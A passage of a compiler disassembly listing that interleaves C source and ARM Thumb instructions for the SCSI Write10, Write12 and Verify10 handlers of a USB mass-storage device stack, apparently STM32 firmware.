      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a724:	697b      	ldr	r3, [r7, #20]
 800a726:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a72a:	7f59      	ldrb	r1, [r3, #29]
 800a72c:	2320      	movs	r3, #32
 800a72e:	2205      	movs	r2, #5
 800a730:	68f8      	ldr	r0, [r7, #12]
 800a732:	f7ff fd75 	bl	800a220 <SCSI_SenseCode>
      return -1;
 800a736:	f04f 33ff 	mov.w	r3, #4294967295
 800a73a:	e0b0      	b.n	800a89e <SCSI_Write10+0x1ba>
    }

    /* case 8 : Hi <> Do */
    if ((hmsc->cbw.bmFlags & 0x80U) == 0x80U)
 800a73c:	697b      	ldr	r3, [r7, #20]
 800a73e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a742:	7f1b      	ldrb	r3, [r3, #28]
 800a744:	b25b      	sxtb	r3, r3
 800a746:	2b00      	cmp	r3, #0
 800a748:	da0b      	bge.n	800a762 <SCSI_Write10+0x7e>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a74a:	697b      	ldr	r3, [r7, #20]
 800a74c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a750:	7f59      	ldrb	r1, [r3, #29]
 800a752:	2320      	movs	r3, #32
 800a754:	2205      	movs	r2, #5
 800a756:	68f8      	ldr	r0, [r7, #12]
 800a758:	f7ff fd62 	bl	800a220 <SCSI_SenseCode>
      return -1;
 800a75c:	f04f 33ff 	mov.w	r3, #4294967295
 800a760:	e09d      	b.n	800a89e <SCSI_Write10+0x1ba>
    }

    /* Check whether Media is ready */
    if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->IsReady(lun) != 0)
 800a762:	68fb      	ldr	r3, [r7, #12]
 800a764:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800a768:	68fa      	ldr	r2, [r7, #12]
 800a76a:	33b0      	adds	r3, #176	; 0xb0
 800a76c:	009b      	lsls	r3, r3, #2
 800a76e:	4413      	add	r3, r2
 800a770:	685b      	ldr	r3, [r3, #4]
 800a772:	689b      	ldr	r3, [r3, #8]
 800a774:	7afa      	ldrb	r2, [r7, #11]
 800a776:	4610      	mov	r0, r2
 800a778:	4798      	blx	r3
 800a77a:	4603      	mov	r3, r0
 800a77c:	2b00      	cmp	r3, #0
 800a77e:	d008      	beq.n	800a792 <SCSI_Write10+0xae>
    {
      SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 800a780:	7af9      	ldrb	r1, [r7, #11]
 800a782:	233a      	movs	r3, #58	; 0x3a
 800a784:	2202      	movs	r2, #2
 800a786:	68f8      	ldr	r0, [r7, #12]
 800a788:	f7ff fd4a 	bl	800a220 <SCSI_SenseCode>
      return -1;
 800a78c:	f04f 33ff 	mov.w	r3, #4294967295
 800a790:	e085      	b.n	800a89e <SCSI_Write10+0x1ba>
    }

    /* Check If media is write-protected */
    if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->IsWriteProtected(lun) != 0)
 800a792:	68fb      	ldr	r3, [r7, #12]
 800a794:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800a798:	68fa      	ldr	r2, [r7, #12]
 800a79a:	33b0      	adds	r3, #176	; 0xb0
 800a79c:	009b      	lsls	r3, r3, #2
 800a79e:	4413      	add	r3, r2
 800a7a0:	685b      	ldr	r3, [r3, #4]
 800a7a2:	68db      	ldr	r3, [r3, #12]
 800a7a4:	7afa      	ldrb	r2, [r7, #11]
 800a7a6:	4610      	mov	r0, r2
 800a7a8:	4798      	blx	r3
 800a7aa:	4603      	mov	r3, r0
 800a7ac:	2b00      	cmp	r3, #0
 800a7ae:	d008      	beq.n	800a7c2 <SCSI_Write10+0xde>
    {
      SCSI_SenseCode(pdev, lun, NOT_READY, WRITE_PROTECTED);
 800a7b0:	7af9      	ldrb	r1, [r7, #11]
 800a7b2:	2327      	movs	r3, #39	; 0x27
 800a7b4:	2202      	movs	r2, #2
 800a7b6:	68f8      	ldr	r0, [r7, #12]
 800a7b8:	f7ff fd32 	bl	800a220 <SCSI_SenseCode>
      return -1;
 800a7bc:	f04f 33ff 	mov.w	r3, #4294967295
 800a7c0:	e06d      	b.n	800a89e <SCSI_Write10+0x1ba>
    }

    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a7c2:	687b      	ldr	r3, [r7, #4]
 800a7c4:	3302      	adds	r3, #2
 800a7c6:	781b      	ldrb	r3, [r3, #0]
 800a7c8:	061a      	lsls	r2, r3, #24
                          ((uint32_t)params[3] << 16) |
 800a7ca:	687b      	ldr	r3, [r7, #4]
 800a7cc:	3303      	adds	r3, #3
 800a7ce:	781b      	ldrb	r3, [r3, #0]
 800a7d0:	041b      	lsls	r3, r3, #16
    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a7d2:	431a      	orrs	r2, r3
                          ((uint32_t)params[4] << 8) |
 800a7d4:	687b      	ldr	r3, [r7, #4]
 800a7d6:	3304      	adds	r3, #4
 800a7d8:	781b      	ldrb	r3, [r3, #0]
 800a7da:	021b      	lsls	r3, r3, #8
                          ((uint32_t)params[3] << 16) |
 800a7dc:	4313      	orrs	r3, r2
                          (uint32_t)params[5];
 800a7de:	687a      	ldr	r2, [r7, #4]
 800a7e0:	3205      	adds	r2, #5
 800a7e2:	7812      	ldrb	r2, [r2, #0]
                          ((uint32_t)params[4] << 8) |
 800a7e4:	4313      	orrs	r3, r2
    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a7e6:	697a      	ldr	r2, [r7, #20]
 800a7e8:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800a7ec:	66d3      	str	r3, [r2, #108]	; 0x6c

    hmsc->scsi_blk_len = ((uint32_t)params[7] << 8) |
 800a7ee:	687b      	ldr	r3, [r7, #4]
 800a7f0:	3307      	adds	r3, #7
 800a7f2:	781b      	ldrb	r3, [r3, #0]
 800a7f4:	021b      	lsls	r3, r3, #8
                         (uint32_t)params[8];
 800a7f6:	687a      	ldr	r2, [r7, #4]
 800a7f8:	3208      	adds	r2, #8
 800a7fa:	7812      	ldrb	r2, [r2, #0]
    hmsc->scsi_blk_len = ((uint32_t)params[7] << 8) |
 800a7fc:	4313      	orrs	r3, r2
 800a7fe:	697a      	ldr	r2, [r7, #20]
 800a800:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800a804:	6713      	str	r3, [r2, #112]	; 0x70

    /* check if LBA address is in the right range */
    if (SCSI_CheckAddressRange(pdev, lun, hmsc->scsi_blk_addr,
 800a806:	697b      	ldr	r3, [r7, #20]
 800a808:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a80c:	6eda      	ldr	r2, [r3, #108]	; 0x6c
 800a80e:	697b      	ldr	r3, [r7, #20]
 800a810:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a814:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800a816:	7af9      	ldrb	r1, [r7, #11]
 800a818:	68f8      	ldr	r0, [r7, #12]
 800a81a:	f000 f97a 	bl	800ab12 <SCSI_CheckAddressRange>
 800a81e:	4603      	mov	r3, r0
 800a820:	2b00      	cmp	r3, #0
 800a822:	da02      	bge.n	800a82a <SCSI_Write10+0x146>
                               hmsc->scsi_blk_len) < 0)
    {
      return -1; /* error */
 800a824:	f04f 33ff 	mov.w	r3, #4294967295
 800a828:	e039      	b.n	800a89e <SCSI_Write10+0x1ba>
    }

    len = hmsc->scsi_blk_len * hmsc->scsi_blk_size;
 800a82a:	697b      	ldr	r3, [r7, #20]
 800a82c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a830:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800a832:	697a      	ldr	r2, [r7, #20]
 800a834:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800a838:	f8b2 2064 	ldrh.w	r2, [r2, #100]	; 0x64
 800a83c:	fb02 f303 	mul.w	r3, r2, r3
 800a840:	613b      	str	r3, [r7, #16]

    /* cases 3,11,13 : Hn,Ho <> D0 */
    if (hmsc->cbw.dDataLength != len)
 800a842:	697b      	ldr	r3, [r7, #20]
 800a844:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a848:	699b      	ldr	r3, [r3, #24]
 800a84a:	693a      	ldr	r2, [r7, #16]
 800a84c:	429a      	cmp	r2, r3
 800a84e:	d00b      	beq.n	800a868 <SCSI_Write10+0x184>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a850:	697b      	ldr	r3, [r7, #20]
 800a852:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a856:	7f59      	ldrb	r1, [r3, #29]
 800a858:	2320      	movs	r3, #32
 800a85a:	2205      	movs	r2, #5
 800a85c:	68f8      	ldr	r0, [r7, #12]
 800a85e:	f7ff fcdf 	bl	800a220 <SCSI_SenseCode>
      return -1;
 800a862:	f04f 33ff 	mov.w	r3, #4294967295
 800a866:	e01a      	b.n	800a89e <SCSI_Write10+0x1ba>
    }

    len = MIN(len, MSC_MEDIA_PACKET);
 800a868:	693b      	ldr	r3, [r7, #16]
 800a86a:	f5b3 5f80 	cmp.w	r3, #4096	; 0x1000
 800a86e:	bf28      	it	cs
 800a870:	f44f 5380 	movcs.w	r3, #4096	; 0x1000
 800a874:	613b      	str	r3, [r7, #16]

    /* Prepare EP to receive first data packet */
    hmsc->bot_state = USBD_BOT_DATA_OUT;
 800a876:	697b      	ldr	r3, [r7, #20]
 800a878:	2201      	movs	r2, #1
 800a87a:	721a      	strb	r2, [r3, #8]
    (void)USBD_LL_PrepareReceive(pdev, MSCOutEpAdd, hmsc->bot_data, len);
 800a87c:	4b0a      	ldr	r3, [pc, #40]	; (800a8a8 <SCSI_Write10+0x1c4>)
 800a87e:	7819      	ldrb	r1, [r3, #0]
 800a880:	697b      	ldr	r3, [r7, #20]
 800a882:	f103 0210 	add.w	r2, r3, #16
 800a886:	693b      	ldr	r3, [r7, #16]
 800a888:	68f8      	ldr	r0, [r7, #12]
 800a88a:	f002 faf3 	bl	800ce74 <USBD_LL_PrepareReceive>
  else /* Write Process ongoing */
  {
    return SCSI_ProcessWrite(pdev, lun);
  }

  return 0;
 800a88e:	2300      	movs	r3, #0
 800a890:	e005      	b.n	800a89e <SCSI_Write10+0x1ba>
    return SCSI_ProcessWrite(pdev, lun);
 800a892:	7afb      	ldrb	r3, [r7, #11]
 800a894:	4619      	mov	r1, r3
 800a896:	68f8      	ldr	r0, [r7, #12]
 800a898:	f000 f9fe 	bl	800ac98 <SCSI_ProcessWrite>
 800a89c:	4603      	mov	r3, r0
}
 800a89e:	4618      	mov	r0, r3
 800a8a0:	3718      	adds	r7, #24
 800a8a2:	46bd      	mov	sp, r7
 800a8a4:	bd80      	pop	{r7, pc}
 800a8a6:	bf00      	nop
 800a8a8:	2000010b 	.word	0x2000010b

0800a8ac <SCSI_Write12>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_Write12(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a8ac:	b580      	push	{r7, lr}
 800a8ae:	b086      	sub	sp, #24
 800a8b0:	af00      	add	r7, sp, #0
 800a8b2:	60f8      	str	r0, [r7, #12]
 800a8b4:	460b      	mov	r3, r1
 800a8b6:	607a      	str	r2, [r7, #4]
 800a8b8:	72fb      	strb	r3, [r7, #11]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a8ba:	68fb      	ldr	r3, [r7, #12]
 800a8bc:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a8c0:	68fb      	ldr	r3, [r7, #12]
 800a8c2:	32b0      	adds	r2, #176	; 0xb0
 800a8c4:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a8c8:	617b      	str	r3, [r7, #20]
  uint32_t len;

  if (hmsc == NULL)
 800a8ca:	697b      	ldr	r3, [r7, #20]
 800a8cc:	2b00      	cmp	r3, #0
 800a8ce:	d102      	bne.n	800a8d6 <SCSI_Write12+0x2a>
  {
    return -1;
 800a8d0:	f04f 33ff 	mov.w	r3, #4294967295
 800a8d4:	e0d7      	b.n	800aa86 <SCSI_Write12+0x1da>
#ifdef USE_USBD_COMPOSITE
  /* Get the Endpoints addresses allocated for this class instance */
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc->bot_state == USBD_BOT_IDLE) /* Idle */
 800a8d6:	697b      	ldr	r3, [r7, #20]
 800a8d8:	7a1b      	ldrb	r3, [r3, #8]
 800a8da:	2b00      	cmp	r3, #0
 800a8dc:	f040 80cd 	bne.w	800aa7a <SCSI_Write12+0x1ce>
  {
    if (hmsc->cbw.dDataLength == 0U)
 800a8e0:	697b      	ldr	r3, [r7, #20]
 800a8e2:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a8e6:	699b      	ldr	r3, [r3, #24]
 800a8e8:	2b00      	cmp	r3, #0
 800a8ea:	d10b      	bne.n	800a904 <SCSI_Write12+0x58>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a8ec:	697b      	ldr	r3, [r7, #20]
 800a8ee:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a8f2:	7f59      	ldrb	r1, [r3, #29]
 800a8f4:	2320      	movs	r3, #32
 800a8f6:	2205      	movs	r2, #5
 800a8f8:	68f8      	ldr	r0, [r7, #12]
 800a8fa:	f7ff fc91 	bl	800a220 <SCSI_SenseCode>
      return -1;
 800a8fe:	f04f 33ff 	mov.w	r3, #4294967295
 800a902:	e0c0      	b.n	800aa86 <SCSI_Write12+0x1da>
    }

    /* case 8 : Hi <> Do */
    if ((hmsc->cbw.bmFlags & 0x80U) == 0x80U)
 800a904:	697b      	ldr	r3, [r7, #20]
 800a906:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a90a:	7f1b      	ldrb	r3, [r3, #28]
 800a90c:	b25b      	sxtb	r3, r3
 800a90e:	2b00      	cmp	r3, #0
 800a910:	da0b      	bge.n	800a92a <SCSI_Write12+0x7e>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a912:	697b      	ldr	r3, [r7, #20]
 800a914:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a918:	7f59      	ldrb	r1, [r3, #29]
 800a91a:	2320      	movs	r3, #32
 800a91c:	2205      	movs	r2, #5
 800a91e:	68f8      	ldr	r0, [r7, #12]
 800a920:	f7ff fc7e 	bl	800a220 <SCSI_SenseCode>
      return -1;
 800a924:	f04f 33ff 	mov.w	r3, #4294967295
 800a928:	e0ad      	b.n	800aa86 <SCSI_Write12+0x1da>
    }

    /* Check whether Media is ready */
    if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->IsReady(lun) != 0)
 800a92a:	68fb      	ldr	r3, [r7, #12]
 800a92c:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800a930:	68fa      	ldr	r2, [r7, #12]
 800a932:	33b0      	adds	r3, #176	; 0xb0
 800a934:	009b      	lsls	r3, r3, #2
 800a936:	4413      	add	r3, r2
 800a938:	685b      	ldr	r3, [r3, #4]
 800a93a:	689b      	ldr	r3, [r3, #8]
 800a93c:	7afa      	ldrb	r2, [r7, #11]
 800a93e:	4610      	mov	r0, r2
 800a940:	4798      	blx	r3
 800a942:	4603      	mov	r3, r0
 800a944:	2b00      	cmp	r3, #0
 800a946:	d00b      	beq.n	800a960 <SCSI_Write12+0xb4>
    {
      SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 800a948:	7af9      	ldrb	r1, [r7, #11]
 800a94a:	233a      	movs	r3, #58	; 0x3a
 800a94c:	2202      	movs	r2, #2
 800a94e:	68f8      	ldr	r0, [r7, #12]
 800a950:	f7ff fc66 	bl	800a220 <SCSI_SenseCode>
      hmsc->bot_state = USBD_BOT_NO_DATA;
 800a954:	697b      	ldr	r3, [r7, #20]
 800a956:	2205      	movs	r2, #5
 800a958:	721a      	strb	r2, [r3, #8]
      return -1;
 800a95a:	f04f 33ff 	mov.w	r3, #4294967295
 800a95e:	e092      	b.n	800aa86 <SCSI_Write12+0x1da>
    }

    /* Check If media is write-protected */
    if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->IsWriteProtected(lun) != 0)
 800a960:	68fb      	ldr	r3, [r7, #12]
 800a962:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800a966:	68fa      	ldr	r2, [r7, #12]
 800a968:	33b0      	adds	r3, #176	; 0xb0
 800a96a:	009b      	lsls	r3, r3, #2
 800a96c:	4413      	add	r3, r2
 800a96e:	685b      	ldr	r3, [r3, #4]
 800a970:	68db      	ldr	r3, [r3, #12]
 800a972:	7afa      	ldrb	r2, [r7, #11]
 800a974:	4610      	mov	r0, r2
 800a976:	4798      	blx	r3
 800a978:	4603      	mov	r3, r0
 800a97a:	2b00      	cmp	r3, #0
 800a97c:	d00b      	beq.n	800a996 <SCSI_Write12+0xea>
    {
      SCSI_SenseCode(pdev, lun, NOT_READY, WRITE_PROTECTED);
 800a97e:	7af9      	ldrb	r1, [r7, #11]
 800a980:	2327      	movs	r3, #39	; 0x27
 800a982:	2202      	movs	r2, #2
 800a984:	68f8      	ldr	r0, [r7, #12]
 800a986:	f7ff fc4b 	bl	800a220 <SCSI_SenseCode>
      hmsc->bot_state = USBD_BOT_NO_DATA;
 800a98a:	697b      	ldr	r3, [r7, #20]
 800a98c:	2205      	movs	r2, #5
 800a98e:	721a      	strb	r2, [r3, #8]
      return -1;
 800a990:	f04f 33ff 	mov.w	r3, #4294967295
 800a994:	e077      	b.n	800aa86 <SCSI_Write12+0x1da>
    }

    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a996:	687b      	ldr	r3, [r7, #4]
 800a998:	3302      	adds	r3, #2
 800a99a:	781b      	ldrb	r3, [r3, #0]
 800a99c:	061a      	lsls	r2, r3, #24
                          ((uint32_t)params[3] << 16) |
 800a99e:	687b      	ldr	r3, [r7, #4]
 800a9a0:	3303      	adds	r3, #3
 800a9a2:	781b      	ldrb	r3, [r3, #0]
 800a9a4:	041b      	lsls	r3, r3, #16
    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a9a6:	431a      	orrs	r2, r3
                          ((uint32_t)params[4] << 8) |
 800a9a8:	687b      	ldr	r3, [r7, #4]
 800a9aa:	3304      	adds	r3, #4
 800a9ac:	781b      	ldrb	r3, [r3, #0]
 800a9ae:	021b      	lsls	r3, r3, #8
                          ((uint32_t)params[3] << 16) |
 800a9b0:	4313      	orrs	r3, r2
                          (uint32_t)params[5];
 800a9b2:	687a      	ldr	r2, [r7, #4]
 800a9b4:	3205      	adds	r2, #5
 800a9b6:	7812      	ldrb	r2, [r2, #0]
                          ((uint32_t)params[4] << 8) |
 800a9b8:	4313      	orrs	r3, r2
    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a9ba:	697a      	ldr	r2, [r7, #20]
 800a9bc:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800a9c0:	66d3      	str	r3, [r2, #108]	; 0x6c

    hmsc->scsi_blk_len = ((uint32_t)params[6] << 24) |
 800a9c2:	687b      	ldr	r3, [r7, #4]
 800a9c4:	3306      	adds	r3, #6
 800a9c6:	781b      	ldrb	r3, [r3, #0]
 800a9c8:	061a      	lsls	r2, r3, #24
                         ((uint32_t)params[7] << 16) |
 800a9ca:	687b      	ldr	r3, [r7, #4]
 800a9cc:	3307      	adds	r3, #7
 800a9ce:	781b      	ldrb	r3, [r3, #0]
 800a9d0:	041b      	lsls	r3, r3, #16
    hmsc->scsi_blk_len = ((uint32_t)params[6] << 24) |
 800a9d2:	431a      	orrs	r2, r3
                         ((uint32_t)params[8] << 8) |
 800a9d4:	687b      	ldr	r3, [r7, #4]
 800a9d6:	3308      	adds	r3, #8
 800a9d8:	781b      	ldrb	r3, [r3, #0]
 800a9da:	021b      	lsls	r3, r3, #8
                         ((uint32_t)params[7] << 16) |
 800a9dc:	4313      	orrs	r3, r2
                         (uint32_t)params[9];
 800a9de:	687a      	ldr	r2, [r7, #4]
 800a9e0:	3209      	adds	r2, #9
 800a9e2:	7812      	ldrb	r2, [r2, #0]
                         ((uint32_t)params[8] << 8) |
 800a9e4:	4313      	orrs	r3, r2
    hmsc->scsi_blk_len = ((uint32_t)params[6] << 24) |
 800a9e6:	697a      	ldr	r2, [r7, #20]
 800a9e8:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800a9ec:	6713      	str	r3, [r2, #112]	; 0x70

    /* check if LBA address is in the right range */
    if (SCSI_CheckAddressRange(pdev, lun, hmsc->scsi_blk_addr,
 800a9ee:	697b      	ldr	r3, [r7, #20]
 800a9f0:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a9f4:	6eda      	ldr	r2, [r3, #108]	; 0x6c
 800a9f6:	697b      	ldr	r3, [r7, #20]
 800a9f8:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a9fc:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800a9fe:	7af9      	ldrb	r1, [r7, #11]
 800aa00:	68f8      	ldr	r0, [r7, #12]
 800aa02:	f000 f886 	bl	800ab12 <SCSI_CheckAddressRange>
 800aa06:	4603      	mov	r3, r0
 800aa08:	2b00      	cmp	r3, #0
 800aa0a:	da02      	bge.n	800aa12 <SCSI_Write12+0x166>
                               hmsc->scsi_blk_len) < 0)
    {
      return -1; /* error */
 800aa0c:	f04f 33ff 	mov.w	r3, #4294967295
 800aa10:	e039      	b.n	800aa86 <SCSI_Write12+0x1da>
    }

    len = hmsc->scsi_blk_len * hmsc->scsi_blk_size;
 800aa12:	697b      	ldr	r3, [r7, #20]
 800aa14:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800aa18:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800aa1a:	697a      	ldr	r2, [r7, #20]
 800aa1c:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800aa20:	f8b2 2064 	ldrh.w	r2, [r2, #100]	; 0x64
 800aa24:	fb02 f303 	mul.w	r3, r2, r3
 800aa28:	613b      	str	r3, [r7, #16]

    /* cases 3,11,13 : Hn,Ho <> D0 */
    if (hmsc->cbw.dDataLength != len)
 800aa2a:	697b      	ldr	r3, [r7, #20]
 800aa2c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800aa30:	699b      	ldr	r3, [r3, #24]
 800aa32:	693a      	ldr	r2, [r7, #16]
 800aa34:	429a      	cmp	r2, r3
 800aa36:	d00b      	beq.n	800aa50 <SCSI_Write12+0x1a4>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800aa38:	697b      	ldr	r3, [r7, #20]
 800aa3a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800aa3e:	7f59      	ldrb	r1, [r3, #29]
 800aa40:	2320      	movs	r3, #32
 800aa42:	2205      	movs	r2, #5
 800aa44:	68f8      	ldr	r0, [r7, #12]
 800aa46:	f7ff fbeb 	bl	800a220 <SCSI_SenseCode>
      return -1;
 800aa4a:	f04f 33ff 	mov.w	r3, #4294967295
 800aa4e:	e01a      	b.n	800aa86 <SCSI_Write12+0x1da>
    }

    len = MIN(len, MSC_MEDIA_PACKET);
 800aa50:	693b      	ldr	r3, [r7, #16]
 800aa52:	f5b3 5f80 	cmp.w	r3, #4096	; 0x1000
 800aa56:	bf28      	it	cs
 800aa58:	f44f 5380 	movcs.w	r3, #4096	; 0x1000
 800aa5c:	613b      	str	r3, [r7, #16]

    /* Prepare EP to receive first data packet */
    hmsc->bot_state = USBD_BOT_DATA_OUT;
 800aa5e:	697b      	ldr	r3, [r7, #20]
 800aa60:	2201      	movs	r2, #1
 800aa62:	721a      	strb	r2, [r3, #8]
    (void)USBD_LL_PrepareReceive(pdev, MSCOutEpAdd, hmsc->bot_data, len);
 800aa64:	4b0a      	ldr	r3, [pc, #40]	; (800aa90 <SCSI_Write12+0x1e4>)
 800aa66:	7819      	ldrb	r1, [r3, #0]
 800aa68:	697b      	ldr	r3, [r7, #20]
 800aa6a:	f103 0210 	add.w	r2, r3, #16
 800aa6e:	693b      	ldr	r3, [r7, #16]
 800aa70:	68f8      	ldr	r0, [r7, #12]
 800aa72:	f002 f9ff 	bl	800ce74 <USBD_LL_PrepareReceive>
  else /* Write Process ongoing */
  {
    return SCSI_ProcessWrite(pdev, lun);
  }

  return 0;
 800aa76:	2300      	movs	r3, #0
 800aa78:	e005      	b.n	800aa86 <SCSI_Write12+0x1da>
    return SCSI_ProcessWrite(pdev, lun);
 800aa7a:	7afb      	ldrb	r3, [r7, #11]
 800aa7c:	4619      	mov	r1, r3
 800aa7e:	68f8      	ldr	r0, [r7, #12]
 800aa80:	f000 f90a 	bl	800ac98 <SCSI_ProcessWrite>
 800aa84:	4603      	mov	r3, r0
}
 800aa86:	4618      	mov	r0, r3
 800aa88:	3718      	adds	r7, #24
 800aa8a:	46bd      	mov	sp, r7
 800aa8c:	bd80      	pop	{r7, pc}
 800aa8e:	bf00      	nop
 800aa90:	2000010b 	.word	0x2000010b

0800aa94 <SCSI_Verify10>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_Verify10(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800aa94:	b580      	push	{r7, lr}
 800aa96:	b086      	sub	sp, #24
 800aa98:	af00      	add	r7, sp, #0
 800aa9a:	60f8      	str	r0, [r7, #12]
 800aa9c:	460b      	mov	r3, r1
 800aa9e:	607a      	str	r2, [r7, #4]
 800aaa0:	72fb      	strb	r3, [r7, #11]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800aaa2:	68fb      	ldr	r3, [r7, #12]
 800aaa4:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800aaa8:	68fb      	ldr	r3, [r7, #12]
 800aaaa:	32b0      	adds	r2, #176	; 0xb0
 800aaac:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800aab0:	617b      	str	r3, [r7, #20]

  if (hmsc == NULL)
 800aab2:	697b      	ldr	r3, [r7, #20]
 800aab4:	2b00      	cmp	r3, #0
 800aab6:	d102      	bne.n	800aabe <SCSI_Verify10+0x2a>
  {
    return -1;
 800aab8:	f04f 33ff 	mov.w	r3, #4294967295
 800aabc:	e025      	b.n	800ab0a <SCSI_Verify10+0x76>
  }

  if ((params[1] & 0x02U) == 0x02U)
 800aabe:	687b      	ldr	r3, [r7, #4]
 800aac0:	3301      	adds	r3, #1
 800aac2:	781b      	ldrb	r3, [r3, #0]
 800aac4:	f003 0302 	and.w	r3, r3, #2
 800aac8:	2b00      	cmp	r3, #0
 800aaca:	d008      	beq.n	800aade <SCSI_Verify10+0x4a>
  {
    SCSI_SenseCode(pdev, lun, ILLEGAL_REQUEST, INVALID_FIELED_IN_COMMAND);
 800aacc:	7af9      	ldrb	r1, [r7, #11]
 800aace:	2324      	movs	r3, #36	; 0x24
 800aad0:	2205      	movs	r2, #5
 800aad2:	68f8      	ldr	r0, [r7, #12]
 800aad4:	f7ff fba4 	bl	800a220 <SCSI_SenseCode>
    return -1; /* Error, Verify Mode Not supported*/
 800aad8:	f04f 33ff 	mov.w	r3, #4294967295
 800aadc:	e015      	b.n	800ab0a <SCSI_Verify10+0x76>
  }

  if (SCSI_CheckAddressRange(pdev, lun, hmsc->scsi_blk_addr, hmsc->scsi_blk_len) < 0)
 800aade:	697b      	ldr	r3, [r7, #20]
 800aae0:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800aae4:	6eda      	ldr	r2, [r3, #108]	; 0x6c
 800aae6:	697b      	ldr	r3, [r7, #20]
 800aae8:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800aaec:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800aaee:	7af9      	ldrb	r1, [r7, #11]
 800aaf0:	68f8      	ldr	r0, [r7, #12]
 800aaf2:	f000 f80e 	bl	800ab12 <SCSI_CheckAddressRange>
 800aaf6:	4603      	mov	r3, r0
 800aaf8:	2b00      	cmp	r3, #0
 800aafa:	da02      	bge.n	800ab02 <SCSI_Verify10+0x6e>
  {
    return -1; /* error */
 800aafc:	f04f 33ff 	mov.w	r3, #4294967295
 800ab00:	e003      	b.n	800ab0a <SCSI_Verify10+0x76>
  }

  hmsc->bot_data_length = 0U;
 800ab02:	697b      	ldr	r3, [r7, #20]
 800ab04:	2200      	movs	r2, #0
 800ab06:	60da      	str	r2, [r3, #12]

  return 0;
 800ab08:	2300      	movs	r3, #0
}
 800ab0a:	4618      	mov	r0, r3
 800ab0c:	3718      	adds	r7, #24
 800ab0e:	46bd      	mov	sp, r7
 800ab10:	bd80      	pop	{r7, pc}

0800ab12 <SCSI_CheckAddressRange>:
  * @param  blk_nbr: number of block to be processed
  * @retval status
  */
static int8_t SCSI_CheckAddressRange(USBD_HandleTypeDef *pdev, uint8_t lun,
                                     uint32_t blk_offset, uint32_t blk_nbr)
{
 800ab12:	b580      	push	{r7, lr}
